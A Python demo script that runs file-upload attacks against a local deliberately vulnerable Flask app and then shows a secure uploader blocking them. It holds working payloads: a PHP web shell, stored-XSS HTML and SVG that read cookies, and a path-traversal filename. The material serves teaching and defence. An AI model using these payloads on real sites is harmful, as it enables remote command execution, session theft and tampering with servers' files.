"""
attacks.py
Runs every common malicious file upload technique against Aperture's vulnerable
uploader, then sends the same files at the secure uploader to show they are
stopped or neutralised.

It talks to the app over HTTP with the requests library, exactly as a browser
would, and it crafts the filename and the Content-Type by hand because those
are two of the things the vulnerable server wrongly trusts.

Start the server first (python3 app.py), then run this (python3 attacks.py).
"""

import requests
import io
import os
from PIL import Image

BASE = "http://127.0.0.1:5002"
VULN = f"{BASE}/upload"
SAFE = f"{BASE}/secure/upload"
TRAVERSAL_TARGET = "/tmp/aperture_pwned.txt"


def banner(n, title):
    print()
    print("=" * 72)
    print(f"  ATTACK {n}: {title}")
    print("=" * 72)


def line():
    print("-" * 72)


def real_png_bytes(color=(90, 140, 200), size=(200, 150)):
    buf = io.BytesIO()
    Image.new("RGB", size, color).save(buf, format="PNG")
    return buf.getvalue()


def on_disk():
    return requests.get(f"{BASE}/debug/list").json()["uploads"]


def send(url, filename, data, content_type):
    return requests.post(url, files={"file": (filename, data, content_type)})


# ---------------------------------------------------------------------------
# 0. Baseline: a normal photo uploads fine in both modes
# ---------------------------------------------------------------------------
def attack_baseline():
    banner(0, "Baseline, a normal photo")
    print("A real PNG should upload cleanly. This is the behaviour we keep.")
    line()
    send(VULN, "holiday.png", real_png_bytes(), "image/png")
    print("vulnerable: holiday.png on disk:", "holiday.png" in on_disk())
    r = send(SAFE, "holiday.png", real_png_bytes(), "image/png")
    print("secure    : accepted and re-encoded to a random name (see flash)")


# ---------------------------------------------------------------------------
# 1. Disguised executable, double extension
# ---------------------------------------------------------------------------
def attack_double_extension():
    banner(1, "Disguised script, double extension (shell.php.png)")
    print("A PHP web shell named shell.php.png. A check that only looks at the")
    print("last extension sees .png and lets it through.")
    line()
    webshell = b"<?php system($_GET['cmd']); ?>"
    send(VULN, "shell.php.png", webshell, "image/png")
    files = on_disk()
    print("vulnerable: stored on disk as:",
          [f for f in files if "shell" in f])
    print("On a PHP server, requesting this file would run the shell and give")
    print("the attacker command execution. Flask does not run PHP, so here the")
    print("damage is that a disguised executable was accepted and stored.")


# ---------------------------------------------------------------------------
# 2. Content-Type (MIME) spoofing
# ---------------------------------------------------------------------------
def attack_contenttype_spoof():
    banner(2, "Content-Type spoofing")
    print("An HTML file sent with the header Content-Type: image/png. A server")
    print("that trusts the header believes it is an image.")
    line()
    html = b"<html><body>not really an image</body></html>"
    send(VULN, "fake.png", html, "image/png")
    # prove what was actually stored
    body = requests.get(f"{BASE}/uploads/fake.png").content
    print("vulnerable: fake.png stored. First bytes on disk:", body[:20])
    print("The header said image/png but the bytes are HTML. No real check ran.")


# ---------------------------------------------------------------------------
# 3. Stored XSS through an uploaded HTML file
# ---------------------------------------------------------------------------
def attack_stored_xss_html():
    banner(3, "Stored XSS through an uploaded HTML file")
    print("Upload an .html file that contains a script. The server serves it")
    print("back as text/html, so the browser runs the script in the site's")
    print("origin. Anyone who opens it is attacked.")
    line()
    payload = (b"<html><body><script>"
               b"document.body.innerHTML='<div style=\"font:20px system-ui;"
               b"padding:40px;color:#b00\"><b>Stored XSS executed.</b><br>"
               b"This file was uploaded as a photo and the browser ran its "
               b"script.<br>document.domain = '+document.domain+'<br>"
               b"cookies readable by attacker: '+(document.cookie||'(none)')+"
               b"'</div>';"
               b"</script></body></html>")
    send(VULN, "pwn.html", payload, "text/html")
    r = requests.get(f"{BASE}/uploads/pwn.html")
    print("vulnerable: /uploads/pwn.html served with Content-Type:",
          r.headers.get("Content-Type"))
    print("            script tag present in response:",
          b"<script>" in r.content)
    print("Open http://127.0.0.1:5002/uploads/pwn.html in a browser to see it run.")


# ---------------------------------------------------------------------------
# 4. Stored XSS through an uploaded SVG
# ---------------------------------------------------------------------------
def attack_stored_xss_svg():
    banner(4, "Stored XSS through an uploaded SVG")
    print("SVG is an image format, but it can carry script. Served as")
    print("image/svg+xml and opened directly, the script runs.")
    line()
    svg = (b'<svg xmlns="http://www.w3.org/2000/svg" width="460" height="130">'
           b'<rect width="460" height="130" fill="#eef"/>'
           b'<text x="20" y="40" font-family="system-ui" font-size="16">'
           b'harmless looking svg</text>'
           b'<script>document.querySelector("text").textContent='
           b'"SVG XSS executed in origin "+document.domain;</script></svg>')
    send(VULN, "pwn.svg", svg, "image/svg+xml")
    r = requests.get(f"{BASE}/uploads/pwn.svg")
    print("vulnerable: /uploads/pwn.svg served with Content-Type:",
          r.headers.get("Content-Type"))
    print("            script tag present:", b"<script>" in r.content)


# ---------------------------------------------------------------------------
# 5. Path traversal through the filename
# ---------------------------------------------------------------------------
def attack_path_traversal():
    banner(5, "Path traversal through the filename")
    print("The filename itself is the attack. ../ steps out of the uploads")
    print("folder and writes the file somewhere it should never reach.")
    line()
    if os.path.exists(TRAVERSAL_TARGET):
        os.remove(TRAVERSAL_TARGET)
    evil_name = "../../../../tmp/aperture_pwned.txt"
    send(VULN, evil_name, b"this file escaped the uploads folder", "text/plain")
    print(f"vulnerable: payload filename was {evil_name!r}")
    if os.path.exists(TRAVERSAL_TARGET):
        print(f"            file written OUTSIDE uploads at {TRAVERSAL_TARGET}")
        print("            contents:", open(TRAVERSAL_TARGET).read())
    else:
        print("            traversal did not escape")


# ---------------------------------------------------------------------------
# 6. Overwriting another file
# ---------------------------------------------------------------------------
def attack_overwrite():
    banner(6, "Overwriting an existing gallery file")
    print("Upload a file with the same name as one already there. With no")
    print("unique naming, it silently replaces the original.")
    line()
    before = requests.get(f"{BASE}/uploads/mountains.jpg").content
    send(VULN, "mountains.jpg", real_png_bytes(color=(10, 10, 10)), "image/jpeg")
    after = requests.get(f"{BASE}/uploads/mountains.jpg").content
    print("vulnerable: mountains.jpg bytes changed:", before != after,
          "  (the original gallery photo was replaced)")


# ---------------------------------------------------------------------------
# 7. No size limit
# ---------------------------------------------------------------------------
def attack_no_size_limit():
    banner(7, "No size limit")
    print("A big upload is accepted with no cap, which lets an attacker fill the")
    print("disk. Here we send a 5 MB file.")
    line()
    big = b"A" * (5 * 1024 * 1024)
    send(VULN, "huge.png", big, "image/png")
    print("vulnerable: huge.png (5 MB) on disk:", "huge.png" in on_disk())


# ---------------------------------------------------------------------------
# 8. The same files against the secure uploader
# ---------------------------------------------------------------------------
def attack_secure_check():
    banner(8, "The same uploads against the secure uploader")
    print("The secure handler checks size, extension allowlist, real content,")
    print("re-encodes the image, and renames it. Each bad upload is handled:")
    line()

    def result_flash(url, filename, data, ctype):
        # the secure handler redirects with a flash message in the query string
        r = requests.post(url, files={"file": (filename, data, ctype)},
                          allow_redirects=False)
        loc = r.headers.get("Location", "")
        import urllib.parse as up
        q = up.parse_qs(up.urlparse(loc).query)
        return q.get("flash", ["(no message)"])[0]

    import re
    def clean(s):
        return re.sub("<[^>]+>", "", s)

    cases = [
        ("shell.php.png", b"<?php system($_GET['cmd']); ?>", "image/png",
         "disguised php shell"),
        ("fake.png", b"<html>not an image</html>", "image/png",
         "html renamed to .png"),
        ("pwn.html", b"<script>alert(1)</script>", "text/html", "html file"),
        ("pwn.svg", b"<svg><script>alert(1)</script></svg>", "image/svg+xml",
         "svg with script"),
        ("huge.png", b"A" * (5 * 1024 * 1024), "image/png", "5 MB file"),
        ("photo.png", real_png_bytes(), "image/png", "a genuine image"),
    ]
    for name, data, ctype, label in cases:
        msg = clean(result_flash(SAFE, name, data, ctype))
        print(f"  {label:<22} -> {msg}")


if __name__ == "__main__":
    print("Running all file upload attacks against", BASE)
    attack_baseline()
    attack_double_extension()
    attack_contenttype_spoof()
    attack_stored_xss_html()
    attack_stored_xss_svg()
    attack_path_traversal()
    attack_overwrite()
    attack_no_size_limit()
    attack_secure_check()
    print()
    line()
    print("Done. Restart the server (python3 app.py) to reset the gallery.")
